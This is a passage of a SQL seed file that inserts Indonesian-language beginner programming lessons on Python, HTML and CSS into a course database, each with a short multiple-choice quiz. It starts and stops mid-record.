![Function & Modular Code](https://sfile.chatglm.cn/images-ppt/81f6cfb86174.jpg)

**Function** adalah blok kode reusable yang melakukan tugas tertentu. Function membuat kode modular, lebih rapi, dan mudah dirawat. Prinsipnya: jangan ulang kode (DRY — Don''t Repeat Yourself).

## Mendefinisikan Function

```python
# Function sederhana
def sapa():
    print("Halo, selamat datang!")

# Memanggil function
sapa()

# Function dengan parameter
def sapa_nama(nama):
    print(f"Halo, {nama}!")

sapa_nama("Budi")
```

## Parameter dan Return

```python
# Parameter dengan default
def sapa(nama, waktu="pagi"):
    return f"Selamat {waktu}, {nama}!"

print(sapa("Andi"))            # Selamat pagi, Andi!
print(sapa("Budi", "malam"))   # Selamat malam, Budi!

# Multiple return
def operasi(a, b):
    return a + b, a - b, a * b

tambah, kurang, kali = operasi(10, 3)
print(tambah, kurang, kali)    # 13 7 30
```

## Args dan Kwargs

```python
# *args - argumen posisi tak terbatas
def jumlah(*args):
    return sum(args)

print(jumlah(1, 2, 3, 4))   # 10

# **kwargs - keyword argumen tak terbatas
def info(**kwargs):
    for k, v in kwargs.items():
        print(f"{k}: {v}")

info(nama="Andi", umur=20, kota="Jakarta")
```

## Scope (Lingkup Variabel)

```python
# Global vs Local
total = 100  # global

def tambah():
    lokal = 5
    return total + lokal

print(tambah())   # 105
# print(lokal)    # ERROR - lokal hanya ada di function

# Mengubah global di dalam function
counter = 0
def increment():
    global counter
    counter += 1
```

## Lambda Function

```python
# Function anonim satu baris
kuadrat = lambda x: x ** 2
print(kuadrat(5))   # 25

# Berguna untuk sort, map, filter
angka = [1, 2, 3, 4, 5]
genap = list(filter(lambda x: x % 2 == 0, angka))
print(genap)   # [2, 4]
```

Prinsip penting dalam mendesain function adalah Single Responsibility Principle: satu function melakukan satu tugas. Function yang baik punya nama deskriptif, parameter minimal, dan return value jelas. Hindari side effect tak terduga seperti memodifikasi global state. Dokumentasikan function dengan docstring yang menjelaskan parameter, return value, dan contoh penggunaan. Tool seperti doctest bahkan bisa menjalankan contoh di docstring sebagai test otomatis. Di project besar, kelompokkan function terkait ke dalam modul atau file terpisah untuk organisasi yang lebih baik dan memudahkan reuse oleh anggota tim lain.

> **Tips:** Function harus melakukan SATU hal dengan baik. Jika function terlalu panjang atau banyak tanggung jawab, pecah jadi function lebih kecil.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '🔧', false, '[{"question":"Kata kunci untuk mendefinisikan function di Python?","options":["function","def","func","define"],"answer":1,"explanation":"Python menggunakan kata kunci ''def'' untuk mendefinisikan function."},{"question":"Apa fungsi ''return'' dalam function?","options":["Mencetak output","Mengembalikan nilai","Menghentikan program","Menerima input"],"answer":1,"explanation":"return mengembalikan nilai dari function ke pemanggil dan mengakhiri eksekusi function."},{"question":"Variabel yang didefinisikan di dalam function disebut?","options":["Global","Local","Static","Constant"],"answer":1,"explanation":"Variabel di dalam function bersifat local — hanya bisa diakses di dalam function tersebut."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('struktur-data-array-object', 2, 9, 'Struktur Data Array & Object', 'struktur-data-array-object', 'Array, list, dictionary, dan operasi dasar struktur data.', '# Struktur Data Array & Object


![Struktur Data Array & Object](https://sfile.chatglm.cn/images-ppt/c9a5bf558fe0.jpeg)

**Struktur data** adalah cara mengorganisir dan menyimpan data. Pilihan struktur data yang tepat membuat program efisien. Di Python, yang paling umum: **list**, **tuple**, **set**, dan **dict**.

## List

List adalah kumpulan terurut, bisa diubah (mutable), dan menerima tipe data campuran.

```python
# Membuat list
buah = ["apel", "mangga", "jeruk"]
angka = [1, 2, 3, 4, 5]
campur = [1, "dua", True, 3.14]

# Akses & slicing
print(buah[0])        # apel (index mulai 0)
print(buah[-1])       # jeruk (index negatif)
print(angka[1:4])     # [2, 3, 4]

# Method list
buah.append("anggur")     # tambah di akhir
buah.insert(0, "pisang")  # tambah di index
buah.remove("mangga")     # hapus by value
buah.pop()                # hapus terakhir
print(len(buah))          # panjang list
```

## Tuple

Tuple seperti list tapi **immutable** (tidak bisa diubah). Cocok untuk data konstan.

```python
koordinat = (10, 20)
warna = ("merah", "hijau", "biru")
print(koordinat[0])   # 10
# koordinat[0] = 5    # ERROR - tuple immutable

# Unpacking
x, y = koordinat
print(x, y)   # 10 20
```

## Set

Set adalah kumpulan **unik** dan tidak berurutan. Cocok untuk menghilangkan duplikat.

```python
angka = {1, 2, 3, 2, 1}
print(angka)   # {1, 2, 3}

# Operasi set
a = {1, 2, 3}
b = {3, 4, 5}
print(a | b)   # union {1,2,3,4,5}
print(a & b)   # intersection {3}
print(a - b)   # difference {1,2}
```

## Dictionary (Object)

Dict menyimpan pasangan **key-value**, mirip object di JavaScript.

```python
mahasiswa = {
    "nama": "Budi",
    "umur": 20,
    "jurusan": "Informatika",
    "nilai": [80, 75, 90]
}

# Akses
print(mahasiswa["nama"])          # Budi
print(mahasiswa.get("ipk", 0))    # 0 (default jika tidak ada)

# Ubah & tambah
mahasiswa["umur"] = 21
mahasiswa["semester"] = 4

# Iterasi
for key, value in mahasiswa.items():
    print(f"{key}: {value}")
```

> **Tips:** Pilih struktur data sesuai kebutuhan: list untuk urutan, set untuk unik, dict untuk lookup cepat berbasis key.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '📚', false, '[{"question":"Struktur data yang tidak bisa diubah (immutable)?","options":["list","tuple","set","dict"],"answer":1,"explanation":"Tuple bersifat immutable — sekali dibuat, elemennya tidak bisa diubah, ditambah, atau dihapus."},{"question":"Apa kegunaan utama ''set''?","options":["Menyimpan data terurut","Menyimpan data unik tanpa duplikat","Lookup by key","Stack LIFO"],"answer":1,"explanation":"Set otomatis menghilangkan duplikat, sehingga cocok untuk menyimpan kumpulan nilai unik."},{"question":"Cara akses value dict dengan key ''nama''?","options":["dict.nama","dict[''nama'']","dict->nama","dict(nama)"],"answer":1,"explanation":"Dict diakses dengan kurung siku: dict[''nama'']. Bisa juga dengan dict.get(''nama'') yang aman dari KeyError."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('error-handling', 2, 10, 'Error Handling', 'error-handling', 'Try-except, jenis error, dan debugging teknik.', '# Error Handling


![Error Handling](https://sfile.chatglm.cn/images-ppt/1bb13cbd71ae.png)

**Error handling** adalah mekanisme menangani error saat runtime agar program tidak crash. Python menggunakan `try/except` untuk menangkap dan menangani exception.

## Try / Except Dasar

```python
try:
    angka = int(input("Masukkan angka: "))
    hasil = 10 / angka
    print(f"Hasil: {hasil}")
except ZeroDivisionError:
    print("Error: tidak bisa dibagi nol!")
except ValueError:
    print("Error: input bukan angka!")
```

## Struktur Lengkap

```python
try:
    # kode yang mungkin error
    file = open("data.txt", "r")
    data = file.read()
except FileNotFoundError:
    print("File tidak ditemukan")
except PermissionError:
    print("Tidak ada izin akses")
except Exception as e:
    print(f"Error umum: {e}")
else:
    print("Berhasil, tidak ada error")
    print(data)
finally:
    # selalu dijalankan
    if ''file'' in locals():
        file.close()
    print("Selesai")
```

## Raise Exception

```python
def set_umur(umur):
    if umur < 0:
        raise ValueError("Umur tidak boleh negatif")
    if umur > 150:
        raise ValueError("Umur tidak masuk akal")
    return umur

try:
    set_umur(-5)
except ValueError as e:
    print(e)   # Umur tidak boleh negatif
```

## Custom Exception

```python
class SaldoTidakCukup(Exception):
    pass

def tarik(saldo, jumlah):
    if jumlah > saldo:
        raise SaldoTidakCukup("Saldo tidak mencukupi")
    return saldo - jumlah

try:
    tarik(50000, 100000)
except SaldoTidakCukup as e:
    print(f"Gagal: {e}")
```

## Teknik Debugging

```python
# 1. Print debugging
print(f"DEBUG: nilai x = {x}")

# 2. Logging
import logging
logging.basicConfig(level=logging.DEBUG)
logging.debug("Pesan debug")
logging.error("Pesan error")

# 3. pdb (Python debugger)
import pdb; pdb.set_trace()
```

Error handling yang baik membedakan aplikasi tangguh dengan yang rapuh. Selain try-except, manfaatkan logging untuk mencatat error ke file agar bisa dianalisis kemudian. Jangan pernah menelan exception diam-diam dengan except pass atau except kosong tanpa log — ini menyembunyikan bug dan menyulitkan debugging. Untuk aplikasi production, gunakan tool monitoring seperti Sentry yang otomatis menangkap dan mengelompokkan error dari pengguna nyata. Tes juga edge case: input kosong, null, nilai ekstrem, dan format tak terduga. Test-driven development atau TDD membantu menemukan error potensial sejak fase pengembangan.

> **Tips:** Tangani error secara spesifik (e.g. `except ValueError`), bukan generic `except:`. Ini membuat error tak terduga tidak tertelan diam-diam.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '⚠️', false, '[{"question":"Blok yang selalu dijalankan terlepas ada error atau tidak?","options":["try","except","else","finally"],"answer":3,"explanation":"Blok finally selalu dieksekusi baik ada error maupun tidak, cocok untuk cleanup (menutup file/koneksi)."},{"question":"Kata kunci untuk membangkitkan exception manual?","options":["throw","raise","error","exception"],"answer":1,"explanation":"Python menggunakan ''raise'' untuk membangkitkan exception secara manual."},{"question":"Exception apa yang muncul saat membagi dengan nol?","options":["ValueError","TypeError","ZeroDivisionError","DivisionError"],"answer":2,"explanation":"ZeroDivisionError muncul saat operasi pembagian dengan nol dilakukan."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('file-io', 2, 11, 'File I/O', 'file-io', 'Membaca dan menulis file, mode operasi, dan context manager.', '# File I/O


![File I/O](https://sfile.chatglm.cn/images-ppt/a9cd79450b7c.jpg)

**File I/O** (Input/Output) adalah operasi membaca dan menulis file. Hampir semua aplikasi nyata melibatkan file: konfigurasi, log, data, dokumen. Python menyediakan fungsi bawaan yang sederhana namun powerful untuk bekerja dengan file dalam berbagai mode, baik teks maupun biner.

## Membaca File

```python
# Membaca seluruh isi
with open("data.txt", "r") as f:
    isi = f.read()
    print(isi)

# Membaca per baris
with open("data.txt", "r") as f:
    for baris in f:
        print(baris.strip())

# Membaca ke list baris
with open("data.txt", "r") as f:
    baris_list = f.readlines()
```

## Menulis File

```python
# Mode ''w'' - overwrite (hapus isi lama)
with open("output.txt", "w") as f:
    f.write("Baris pertama\n")
    f.write("Baris kedua\n")

# Mode ''a'' - append (tambah di akhir)
with open("log.txt", "a") as f:
    f.write("Log baru\n")

# Menulis list
lines = ["satu", "dua", "tiga"]
with open("list.txt", "w") as f:
    f.writelines(line + "\n" for line in lines)
```

## Mode Operasi File

```text
''r''  - read (default), file harus ada
''w''  - write, overwrite / buat baru
''a''  - append, tambah di akhir
''r+'' - read & write
''w+'' - write & read (overwrite)
''a+'' - append & read
''b''  - binary mode (rb, wb)
```

## Context Manager (with)

```python
# Dengan ''with'' - file otomatis ditutup
with open("data.txt") as f:
    data = f.read()
# file tertutup otomatis di sini

# Tanpa ''with'' - harus close manual
f = open("data.txt")
data = f.read()
f.close()   # mudah lupa!
```

## Bekerja dengan CSV dan JSON

```python
import json
import csv

# JSON
data = {"nama": "Budi", "umur": 20}
with open("data.json", "w") as f:
    json.dump(data, f, indent=2)

with open("data.json") as f:
    loaded = json.load(f)

# CSV
with open("data.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["nama", "umur"])
    writer.writerow(["Andi", 25])
```

> **Tips:** Selalu gunakan `with` statement saat membuka file. Ini memastikan file tertutup otomatis meski terjadi error, mencegah resource leak.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '📄', false, '[{"question":"Mode file untuk menambahkan isi tanpa menghapus yang lama?","options":["''w''","''r''","''a''","''x''"],"answer":2,"explanation":"Mode ''a'' (append) menambahkan konten di akhir file tanpa menghapus isi yang sudah ada."},{"question":"Keunggulan menggunakan ''with open()'' dibanding ''open()'' manual?","options":["Lebih cepat","File otomatis tertutup","Bisa baca file binary","Tidak perlu nama file"],"answer":1,"explanation":"''with'' (context manager) memastikan file otomatis ditutup meski terjadi exception, mencegah resource leak."},{"question":"Modul Python untuk membaca file JSON?","options":["csv","json","yaml","file"],"answer":1,"explanation":"Modul ''json'' menyediakan fungsi json.load() dan json.dump() untuk membaca/menulis file JSON."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('project-aplikasi-cli', 2, 12, 'Project: Aplikasi CLI', 'project-aplikasi-cli', 'Membangun aplikasi command-line interaktif dengan Python.', '# Project: Aplikasi CLI


![Project: Aplikasi CLI](https://sfile.chatglm.cn/images-ppt/fcb439bdacf9.jpg)

Saatnya menggabungkan semua yang Anda pelajari! Kita akan membangun **Aplikasi To-Do List CLI** interaktif dengan Python. Project ini melatih variabel, function, loop, struktur data, dan file I/O.

## Spesifikasi Aplikasi

Aplikasi to-do list dengan fitur:
- Tambah tugas
- Lihat semua tugas
- Tandai tugas selesai
- Hapus tugas
- Simpan ke file (persisten)

## Struktur Kode

```python
import json
import os

FILE_NAME = "todos.json"

def load_todos():
    if os.path.exists(FILE_NAME):
        with open(FILE_NAME) as f:
            return json.load(f)
    return []

def save_todos(todos):
    with open(FILE_NAME, "w") as f:
        json.dump(todos, f, indent=2)

def tambah_tugas(todos):
    tugas = input("Masukkan tugas: ")
    todos.append({"tugas": tugas, "selesai": False})
    save_todos(todos)
    print("✓ Tugas ditambahkan!")
```

## Menu Utama

```python
def lihat_tugas(todos):
    if not todos:
        print("Belum ada tugas.")
        return
    for i, t in enumerate(todos):
        status = "✓" if t["selesai"] else "○"
        print(f"{i+1}. [{status}] {t[''tugas'']}")

def selesai_tugas(todos):
    lihat_tugas(todos)
    idx = int(input("Nomor tugas selesai: ")) - 1
    if 0 <= idx < len(todos):
        todos[idx]["selesai"] = True
        save_todos(todos)
        print("✓ Tugas diselesaikan!")

def hapus_tugas(todos):
    lihat_tugas(todos)
    idx = int(input("Nomor tugas hapus: ")) - 1
    if 0 <= idx < len(todos):
        todos.pop(idx)
        save_todos(todos)
        print("✓ Tugas dihapus!")
```

## Loop Utama

```python
def main():
    todos = load_todos()
    while True:
        print("\n=== TO-DO LIST ===")
        print("1. Tambah tugas")
        print("2. Lihat tugas")
        print("3. Tandai selesai")
        print("4. Hapus tugas")
        print("5. Keluar")
        pilihan = input("Pilih menu: ")

        if pilihan == "1":
            tambah_tugas(todos)
        elif pilihan == "2":
            lihat_tugas(todos)
        elif pilihan == "3":
            selesai_tugas(todos)
        elif pilihan == "4":
            hapus_tugas(todos)
        elif pilihan == "5":
            print("Sampai jumpa!")
            break
        else:
            print("Pilihan tidak valid!")

if __name__ == "__main__":
    main()
```

## Tantangan Lanjutan

- Tambahkan prioritas (tinggi/sedang/rendah)
- Tambahkan deadline & sort by deadline
- Tambahkan kategori/tag
- Buat fitur search/filter
- Tambahkan warna di terminal (library `colorama`)

Setelah selesai, paketkan aplikasi Anda dengan library seperti Click atau Typer untuk CLI yang lebih profesional, lengkap dengan help otomatis dan auto-completion di terminal.

> **Tips:** Pisahkan logic ke function kecil. Tes setiap fitur sebelum lanjut. Gunakan Git untuk version control!



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '🚀', true, '[{"question":"Tujuan utama project CLI ini?","options":["Belajar database","Menggabungkan konsep Python dalam aplikasi nyata","Membuat GUI","Belajar web"],"answer":1,"explanation":"Project ini menggabungkan konsep variabel, function, loop, struktur data, dan file I/O menjadi aplikasi nyata."},{"question":"Format file yang digunakan untuk menyimpan data tugas?","options":["CSV","JSON","XML","TXT"],"answer":1,"explanation":"Project ini menggunakan JSON karena mudah merepresentasikan struktur data dict/list dan dibaca modul json."},{"question":"Agar data tugas tetap ada setelah aplikasi ditutup, kita harus?","options":["Gunakan variabel global","Simpan ke file","Gunakan list","Pakai loop"],"answer":1,"explanation":"Data di memori hilang saat program berhenti. Menyimpan ke file membuat data persisten (tetap ada)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-web-development', 3, 1, 'Pengenalan Web Development', 'pengenalan-web-development', 'Frontend vs backend, full-stack, dan tech stack web modern.', '# Pengenalan Web Development


![Pengenalan Web Development](https://sfile.chatglm.cn/images-ppt/5cfe7a5509f6.jpg)

**Web development** adalah pembuatan aplikasi/website yang berjalan di browser. Web developer dibagi jadi **frontend** (apa yang dilihat user), **backend** (logic di server), dan **full-stack** (keduanya).

## Frontend vs Backend

```text
[Browser/User]
     |
     | HTTP request (klik, ketik)
     v
[FRONTEND]  HTML, CSS, JavaScript
     |
     | API request (fetch/axios)
     v
[BACKEND]   Node.js, Python, PHP, Java
     |
     | SQL query
     v
[DATABASE]  PostgreSQL, MySQL, MongoDB
```

## Frontend Development

Frontend berfokus pada antarmuka pengguna. Tiga teknologi wajib:

```text
HTML       - struktur & konten halaman
CSS        - tampilan & layout
JavaScript - interaktivitas & logic
```

Framework frontend populer: **React**, **Vue**, **Angular**, **Svelte**. Mereka mempermudah membangun UI kompleks dan reaktif.

## Backend Development

Backend menangani logic server, database, dan API. Bahasa populer untuk backend:

```text
Node.js (JavaScript) - Express, NestJS
Python              - Django, Flask, FastAPI
PHP                 - Laravel
Java                - Spring Boot
Go                  - Gin, Echo
Ruby                - Ruby on Rails
```

## Database

```text
SQL (Relational)        NoSQL
- PostgreSQL             - MongoDB (document)
- MySQL                  - Redis (key-value)
- SQLite                 - Cassandra (column)
- SQL Server             - Neo4j (graph)
```

## Tech Stack Populer

```text
MERN  - MongoDB, Express, React, Node.js
MEAN  - MongoDB, Express, Angular, Node
LAMP  - Linux, Apache, MySQL, PHP
JAM   - JavaScript, API, Markup
Next.js + Prisma + PostgreSQL
```

## Perjalanan Request Web

1. User buka `https://example.com`
2. Browser resolve DNS ke IP server
3. Browser kirim HTTP request
4. Server terima request, jalankan backend
5. Backend query database
6. Backend kirim response (HTML/JSON)
7. Browser render halaman ke user

Sebagai web developer, Anda akan sering berinteraksi dengan tools seperti browser DevTools atau F12 untuk inspeksi DOM, network, dan debugging JavaScript. Version control Git dan platform GitHub atau GitLab adalah standar untuk kolaborasi. Package manager seperti npm atau pnpm mengelola dependency, sementara bundler seperti Vite dan Webpack mengoptimasi aset untuk produksi. Deployment modern menggunakan platform seperti Vercel, Netlify, atau VPS dengan Docker. Pahami juga konsep API (REST, GraphQL), autentikasi (JWT, session), dan web performance (Core Web Vitals). Belajar web development adalah perjalanan panjang namun sangat memuaskan dan penuh peluang karir.

> **Tips:** Mulai dengan HTML → CSS → JavaScript dasar. Setelah kuat frontend, lanjut backend. Jangan langsung lompat ke framework sebelum menguasai fundamental!



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '🌐', false, '[{"question":"Apa yang dikerjakan frontend developer?","options":["Database","Server logic","Antarmuka pengguna di browser","Jaringan"],"answer":2,"explanation":"Frontend developer fokus pada antarmuka pengguna yang tampil di browser menggunakan HTML, CSS, dan JavaScript."},{"question":"Tiga teknologi wajib frontend adalah?","options":["Python, Java, C++","HTML, CSS, JavaScript","SQL, PHP, Ruby","React, Vue, Angular"],"answer":1,"explanation":"HTML (struktur), CSS (tampilan), dan JavaScript (interaktivitas) adalah tiga teknologi fundamental frontend."},{"question":"Apa itu developer ''full-stack''?","options":["Hanya frontend","Hanya backend","Menguasai frontend dan backend","Spesialis database"],"answer":2,"explanation":"Full-stack developer mampu mengerjakan baik frontend maupun backend (dan biasanya database)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('html-dasar', 3, 2, 'HTML Dasar', 'html-dasar', 'Struktur HTML, tag, elemen, atribut, dan dokumen dasar.', '# HTML Dasar


![HTML Dasar](https://sfile.chatglm.cn/images-ppt/759baf68f428.jpg)

**HTML (HyperText Markup Language)** adalah bahasa markup yang menjadi struktur setiap halaman web. HTML bukan bahasa pemrograman — ia hanya mendeskripsikan struktur konten dengan tag.

## Struktur Dokumen HTML

```html
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Pertama Saya</title>
</head>
<body>
    <h1>Halo Dunia!</h1>
    <p>Ini paragraf pertama saya.</p>
</body>
</html>
```

## Tag dan Elemen

```html
<!-- Heading (h1-h6) -->
<h1>Judul Utama</h1>
<h2>Sub Judul</h2>

<!-- Paragraf & teks -->
<p>Teks paragraf <strong>tebal</strong> dan <em>miring</em>.</p>

<!-- Link & gambar -->
<a href="https://google.com">Ke Google</a>
<img src="gambar.jpg" alt="Deskripsi gambar">

<!-- List -->
<ul>
    <li>Item 1</li>
    <li>Item 2</li>
</ul>

<ol>
    <li>Pertama</li>
    <li>Kedua</li>
</ol>
```

## Atribut

Atribut memberi informasi tambahan pada elemen.

```html
<a href="url" target="_blank">Buka di tab baru</a>
<img src="foto.jpg" alt="Foto" width="300">
<div id="header" class="container main">Konten</div>
<input type="text" placeholder="Nama" required>
```

## Elemen Struktural

```html
<div class="card">
    <h3>Judul Card</h3>
    <p>Isi card di sini.</p>
    <button>Klik</button>
</div>

<span class="highlight">teks inline</span>
```

## Komentar

```html
<!-- Ini komentar, tidak tampil di browser -->
```

HTML dirancang untuk struktur, bukan tampilan — gunakan CSS untuk styling. Hindari tag seperti font atau center yang sudah deprecated. Strukturkan dokumen dengan logis: gunakan heading secara hierarkis (h1 sekali per halaman, lalu h2, h3), dan pastikan setiap input form punya label terkait untuk aksesibilitas. Validasi HTML Anda lewat W3C Validator di validator.w3.org untuk memastikan tidak ada error sintaks. Semantik HTML yang baik tidak hanya membantu SEO dan screen reader, tapi juga membuat kode lebih mudah dirawat dalam jangka panjang. Gunakan komentar HTML untuk mendokumentasikan bagian penting halaman, terutama di project besar. Pelajari juga elemen baru HTML5 seperti video, audio, canvas, dan SVG yang memungkinkan konten multimedia tanpa plugin. Terakhir, pisahkan struktur (HTML), tampilan (CSS), dan perilaku (JavaScript) ke file terpisah agar kode bersih, modular, dan mudah di-maintain oleh tim.

> **Tips:** Selalu tutup tag yang dibuka (kecuali self-closing seperti `<img>`). Gunakan atribut `alt` di setiap gambar untuk aksesibilitas dan SEO.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '📄', false, '[{"question":"Apa kepanjangan HTML?","options":["Hyper Text Markup Language","High Tech Modern Language","Home Tool Markup Language","Hyperlink Text Mark Language"],"answer":0,"explanation":"HTML = HyperText Markup Language, bahasa markup untuk struktur halaman web."},{"question":"Tag HTML untuk membuat heading terbesar?","options":["<head>","<h6>","<h1>","<title>"],"answer":2,"explanation":"<h1> adalah heading level 1 (terbesar). Urutan: h1, h2, h3, h4, h5, h6 (terkecil)."},{"question":"Atribut HTML untuk membuka link di tab baru?","options":["target=''_new''","target=''_blank''","new=''true''","open=''tab''"],"answer":1,"explanation":"target=''_blank'' membuka link di tab/jendela baru browser."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('html-forms-semantic', 3, 3, 'HTML Forms & Semantic', 'html-forms-semantic', 'Form, input, semantic HTML5: header, nav, main, section, footer.', '# HTML Forms & Semantic


![HTML Forms & Semantic](https://sfile.chatglm.cn/images-ppt/5f4bd43552ac.png)

**Form** adalah cara menerima input dari user. **Semantic HTML5** menggunakan tag yang bermakna untuk struktur halaman, meningkatkan aksesibilitas dan SEO.

## Form Dasar

```html
<form action="/submit" method="POST">
    <label for="nama">Nama:</label>
    <input type="text" id="nama" name="nama" required>

    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required>

    <label for="pwd">Password:</label>
    <input type="password" id="pwd" name="pwd">

    <button type="submit">Kirim</button>
</form>
```

## Tipe Input

```html
<input type="text" placeholder="Teks">
<input type="email" placeholder="email@contoh.com">
<input type="password" placeholder="Password">
<input type="number" min="0" max="100">
<input type="date">
<input type="checkbox" id="setuju">
<input type="radio" name="gender" value="P">
<input type="file" accept="image/*">
<input type="color">
<input type="range" min="0" max="10">
```

## Dropdown, Textarea, Select

```html
<select name="kota">
    <option value="jakarta">Jakarta</option>
    <option value="bandung">Bandung</option>
    <option value="surabaya">Surabaya</option>
</select>

<textarea name="pesan" rows="4" cols="30"></textarea>
```

## Semantic HTML5

Tag semantic memberi makna pada struktur, lebih baik dari `<div>` generik.

```html
<header>
    <nav>
        <a href="/">Home</a>
        <a href="/about">About</a>
    </nav>
</header>

<main>
    <article>
        <h1>Judul Artikel</h1>
        <section>
            <h2>Bagian 1</h2>
            <p>Isi bagian.</p>
        </section>
        <aside>Info terkait</aside>
    </article>
</main>

<footer>
    <p>&copy; 2024 Website Saya</p>
</footer>
```

## Tabel

```html
<table>
    <thead>
        <tr><th>Nama</th><th>Umur</th></tr>
    </thead>
    <tbody>
        <tr><td>Andi</td><td>25</td></tr>
        <tr><td>Budi</td><td>30</td></tr>
    </tbody>
</table>
```

Form adalah gerbang interaksi user dengan aplikasi web. Selalu validasi input di sisi client dengan atribut required, type, dan pattern, DAN juga di sisi server — jangan pernah percaya input client karena bisa dimanipulasi. Gunakan atribut autocomplete untuk pengalaman yang lebih baik, dan label yang terhubung via for dan id untuk aksesibilitas. Untuk upload file, set atribut enctype menjadi multipart atau form-data pada elemen form. Semantic HTML5 tidak hanya soal tag, tapi juga struktur logis: gunakan main sekali per halaman, article untuk konten mandiri, dan section untuk pengelompokan tematik. Aksesibilitas atau a11y bukan fitur tambahan, tapi keharusan agar web bisa dipakai semua orang termasuk penyandang disabilitas. Gunakan atribut ARIA ketika diperlukan untuk komponen interaktif kustom. Test halaman Anda menggunakan screen reader seperti NVDA atau tool Lighthouse di Chrome DevTools untuk memastikan aksesibilitas yang baik.

> **Tips:** Gunakan tag semantic (`<header>`, `<nav>`, `<main>`, `<article>`) daripada `<div>` generik. Ini membantu screen reader dan SEO memahami struktur halaman.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '📝', false, '[{"question":"Tag HTML untuk membuat form adalah?","options":["<input>","<form>","<field>","<submit>"],"answer":1,"explanation":"<form> adalah container untuk elemen input. Method POST/GET dan atribut action menentukan cara submit."},{"question":"Tag semantic untuk bagian navigasi?","options":["<menu>","<nav>","<navigation>","<navbar>"],"answer":1,"explanation":"<nav> adalah tag semantic HTML5 untuk bagian navigasi utama halaman."},{"question":"Tipe input untuk menerima email dengan validasi otomatis?","options":["type=''text''","type=''email''","type=''mail''","type=''address''"],"answer":1,"explanation":"type=''email'' otomatis memvalidasi format email saat form disubmit."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('css-dasar', 3, 4, 'CSS Dasar', 'css-dasar', 'Selector, properti, warna, font, dan box model CSS.', '# CSS Dasar


![CSS Dasar](https://sfile.chatglm.cn/images-ppt/a68ab3ebb443.png)

**CSS (Cascading Style Sheets)** mengatur tampilan halaman web: warna, font, layout, dan animasi. CSS memisahkan presentasi dari struktur (HTML).

## Cara Menambahkan CSS

```html
<!-- 1. Inline (tidak disarankan) -->
<p style="color: red;">Teks merah</p>

<!-- 2. Internal di <head> -->
<style>
  p { color: blue; }
</style>

<!-- 3. External (REKOMENDASI) -->
<link rel="stylesheet" href="style.css">
```

## Selector

```css
/* Selector elemen */
p { color: gray; }
h1 { font-size: 32px; }

/* Selector class (.) */
.highlight { background: yellow; }
.card { padding: 20px; }

/* Selector id (#) */
#header { background: navy; }

/* Selector turunan */
.card p { color: #333; }
div > p { margin: 10px; }

/* Multiple selector */
h1, h2, h3 { font-family: Arial; }

/* Pseudo-class */
a:hover { color: red; }
input:focus { border-color: blue; }
li:nth-child(odd) { background: #eee; }
```

## Warna dan Font

```css
body {
    color: #333;                    /* hex */
    background-color: rgb(240, 240, 240);  /* rgb */
    color: rgba(0, 0, 0, 0.8);      /* rgb + alpha */
    font-family: ''Segoe UI'', Arial, sans-serif;
    font-size: 16px;
    font-weight: bold;
    line-height: 1.6;
}
```

## Box Model

Setiap elemen HTML adalah "box" dengan content, padding, border, dan margin.

```text
+-----------------------------------+
|           margin                  |
|  +-----------------------------+  |
|  |         border              |  |
|  |  +-----------------------+  |  |
|  |  |      padding          |  |  |
|  |  |  +-----------------+  |  |  |
|  |  |  |    content      |  |  |  |
|  |  |  +-----------------+  |  |  |
|  |  +-----------------------+  |  |
|  +-----------------------------+  |
+-----------------------------------+
```

```css
.box {
    width: 200px;
    height: 100px;
    padding: 20px;
    border: 2px solid black;
    margin: 15px;
    box-sizing: border-box;  /* padding & border termasuk width */
}
```

> **Tips:** Selalu set `box-sizing: border-box` di reset CSS. Ini membuat width/height konsisten karena sudah termasuk padding dan border.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

